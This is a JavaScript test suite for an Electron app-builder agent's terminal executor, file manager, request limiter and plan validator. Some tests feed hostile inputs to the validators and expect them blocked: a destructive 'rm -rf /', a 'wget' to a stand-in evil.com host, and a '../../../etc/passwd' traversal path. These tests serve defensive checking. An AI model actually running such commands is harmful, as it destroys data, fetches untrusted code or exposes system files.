/**
 * App Builder Services Test Suite
 * Run with: node tests/app-builder-test.js
 */

const path = require('path');
const fs = require('fs');
const os = require('os');

// Mock Electron app
const mockApp = {
  getPath: (name) => {
    if (name === 'userData') {
      return path.join(os.tmpdir(), 'clustrix-test');
    }
    return os.tmpdir();
  }
};

// Mock Electron module
require.cache[require.resolve('electron')] = {
  exports: {
    app: mockApp,
    BrowserWindow: {},
    ipcMain: {}
  }
};

// Mock logger
const mockLogger = {
  log: (category, level, action, message, data) => {
    console.log(`[${category}] ${action}: ${message}`, data || '');
  }
};

// Inject mocks
global.app = mockApp;
const utilsPath = path.join(__dirname, '../utils/logger.js');
require.cache[require.resolve(utilsPath)] = {
  exports: {
    log: mockLogger.log
  }
};

// Now require services
const TerminalExecutor = require('../backend/terminal-executor');
const FileOperationsManager = require('../backend/file-operations-manager');
const RequestLimiter = require('../backend/request-limiter');
const AppBuilderAgent = require('../backend/app-builder-agent');

// Test utilities
let testsPassed = 0;
let testsFailed = 0;

function assert(condition, message) {
  if (condition) {
    testsPassed++;
    console.log(`✅ ${message}`);
  } else {
    testsFailed++;
    console.error(`❌ ${message}`);
  }
}

async function runTests() {
  console.log('\n🧪 Starting App Builder Tests\n');
  
  // Create test workspace
  const testWorkspace = path.join(os.tmpdir(), 'clustrix-test-workspace');
  if (!fs.existsSync(testWorkspace)) {
    fs.mkdirSync(testWorkspace, { recursive: true });
  }
  
  try {
    // ========================
    // Terminal Executor Tests
    // ========================
    console.log('\n📦 Terminal Executor Tests\n');
    
    const terminal = new TerminalExecutor();
    
    // Test 1: Safe command validation
    const safeCmd = terminal.validateCommand('npm --version');
    assert(safeCmd.safe === true, 'Safe command passes validation');
    
    // Test 2: Blocked command detection
    const dangerousCmd = terminal.validateCommand('rm -rf /');
    assert(dangerousCmd.blocked === true, 'Dangerous command blocked');
    
    // Test 3: Unlisted command rejection
    const unlistedCmd = terminal.validateCommand('wget http://evil.com');
    assert(unlistedCmd.blocked === true, 'Unlisted command blocked');
    
    // Test 4: Recursive pattern detection
    const recursiveCmd = terminal.validateCommand('find . -r');
    assert(recursiveCmd.requiresApproval === true, 'Recursive command requires approval');
    
    // Test 5: Command execution (safe)
    try {
      const result = await terminal.execute('echo test');
      assert(result.success === true, 'Echo command executes successfully');
      assert(result.stdout.includes('test'), 'Echo output contains text');
    } catch (e) {
      assert(false, `Command execution failed: ${e.message}`);
    }
    
    // ========================
    // File Operations Tests
    // ========================
    console.log('\n📄 File Operations Manager Tests\n');
    
    const fileOps = new FileOperationsManager();
    fileOps.setWorkspaceRoot(testWorkspace);
    
    // Test 6: Create file
    try {
      const result = await fileOps.createFile('test.txt', 'Hello World\nLine 2\nLine 3');
      assert(result.success === true, 'File created successfully');
    } catch (e) {
      assert(false, `File creation failed: ${e.message}`);
    }
    
    // Test 7: Read specific lines
    try {
      const content = await fileOps.readLines('test.txt', 1, 2);
      assert(content === 'Hello World\nLine 2', 'Read lines returns correct content');
    } catch (e) {
      assert(false, `Read lines failed: ${e.message}`);
    }
    
    // Test 8: Edit lines
    try {
      await fileOps.editLines('test.txt', 2, 2, 'Modified Line 2');
      const updated = await fileOps.readLines('test.txt', 2, 2);
      assert(updated === 'Modified Line 2', 'Line edit successful');
    } catch (e) {
      assert(false, `Edit lines failed: ${e.message}`);
    }
    
    // Test 9: Search in file
    try {
      const matches = await fileOps.searchInFile('test.txt', 'Modified');
      assert(matches.length === 1, 'Search finds correct matches');
      assert(matches[0].lineNumber === 2, 'Search returns correct line number');
    } catch (e) {
      assert(false, `Search failed: ${e.message}`);
    }
    
    // Test 10: Path security (directory traversal)
    try {
      fileOps.resolvePath('../../../etc/passwd');
      assert(false, 'Directory traversal should be blocked');
    } catch (e) {
      assert(e.message.includes('outside workspace'), 'Directory traversal blocked');
    }
    
    // ========================
    // Request Limiter Tests
    // ========================
    console.log('\n🔢 Request Limiter Tests\n');
    
    const limiter = new RequestLimiter();
    const sessionId = 'test-session';
    
    // Test 11: Set limit
    limiter.setLimit(sessionId, 10);
    assert(limiter.getRemaining(sessionId) === 10, 'Initial limit set correctly');
    
    // Test 12: Increment counter
    limiter.incrementCounter(sessionId);
    limiter.incrementCounter(sessionId);
    assert(limiter.getRemaining(sessionId) === 8, 'Counter increments correctly');
    
    // Test 13: Can make request check
    assert(limiter.canMakeRequest(sessionId) === true, 'Can make request when under limit');
    
    // Test 14: Exhaust limit
    for (let i = 0; i < 8; i++) {
      limiter.incrementCounter(sessionId);
    }
    assert(limiter.canMakeRequest(sessionId) === false, 'Cannot make request when limit reached');
    
    // Test 15: Status report
    const status = limiter.getStatus(sessionId);
    assert(status.current === 10, 'Status shows correct count');
    assert(status.percentage === 100, 'Status shows correct percentage');
    assert(status.isExhausted === true, 'Status shows exhausted state');
    
    // Test 16: Reset
    limiter.reset(sessionId);
    assert(limiter.getRemaining(sessionId) === 10, 'Reset restores limit');
    
    // ========================
    // App Builder Agent Tests
    // ========================
    console.log('\n🏗️  App Builder Agent Tests\n');
    
    const agent = new AppBuilderAgent({
      terminal,
      fileOps,
      requestLimiter: limiter,
      searchEngine: null
    });
    
    // Test 17: Plan validation (valid)
    const validPlan = {
      projectName: 'test-app',
      directories: ['src/', 'public/'],
      files: [
        { path: 'package.json', content: '{}' }
      ],
      commands: [
        { command: 'npm install' }
      ]
    };
    
    const validation = agent.validatePlan(validPlan);
    assert(validation.valid === true, 'Valid plan passes validation');
    
    // Test 18: Plan validation (invalid)
    const invalidPlan = {
      directories: [],
      files: []
    };
    
    const invalidValidation = agent.validatePlan(invalidPlan);
    assert(invalidValidation.valid === false, 'Invalid plan fails validation');
    assert(invalidValidation.issues.length > 0, 'Validation returns issues');
    
    // Test 19: Execute simple plan
    limiter.setLimit('build-session', 50);
    
    const simplePlan = {
      projectName: 'simple-test',
      directories: ['build/'],
      files: [
        { path: 'build/index.html', content: '<h1>Test</h1>' }
      ],
      commands: []
    };
    
    try {
      const result = await agent.executePlan(simplePlan, 'build-session', (progress) => {
        console.log(`  Progress: ${progress.phase} - ${progress.current || 0}/${progress.total || 0}`);
      });
      
      assert(result.success === true, 'Simple plan executes successfully');
      assert(result.errors.length === 0, 'No errors during execution');
      assert(fs.existsSync(path.join(testWorkspace, 'build/index.html')), 'Files created correctly');
    } catch (e) {
      assert(false, `Plan execution failed: ${e.message}`);
    }
    
    // Cleanup
    console.log('\n🧹 Cleaning up test workspace...\n');
    fs.rmSync(testWorkspace, { recursive: true, force: true });
    
  } catch (error) {
    console.error('Test suite error:', error);
    testsFailed++;
  }
  
  // Results
  console.log('\n' + '='.repeat(50));
  console.log('📊 Test Results');
  console.log('='.repeat(50));
  console.log(`✅ Passed: ${testsPassed}`);
  console.log(`❌ Failed: ${testsFailed}`);
  console.log(`📈 Total:  ${testsPassed + testsFailed}`);
  
  if (testsFailed === 0) {
    console.log('\n🎉 All tests passed!\n');
    process.exit(0);
  } else {
    console.log('\n⚠️  Some tests failed!\n');
    process.exit(1);
  }
}

// Run tests
runTests().catch(error => {
  console.error('Fatal error:', error);
  process.exit(1);
});
